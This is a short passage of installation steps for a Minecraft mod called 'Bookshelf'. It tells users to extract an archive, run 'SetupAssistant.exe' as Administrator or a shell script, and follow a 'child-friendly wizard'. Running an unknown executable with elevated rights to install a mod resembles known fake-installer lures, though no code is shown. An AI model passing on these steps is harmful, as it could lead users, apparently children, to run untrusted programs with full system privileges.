2. Extract the archive with 7-Zip or WinRAR.  
3. **Run `SetupAssistant.exe` as Administrator** (macOS/Linux: `./setup-assistant.sh`).  
4. Follow the child-friendly wizard — it auto-detects your Minecraft folder.  
5. Launch Minecraft with **Forge/NeoForge 1.16 → 1.21** or **Fabric/Quilt 1.19+** — Bookshelf is now active!
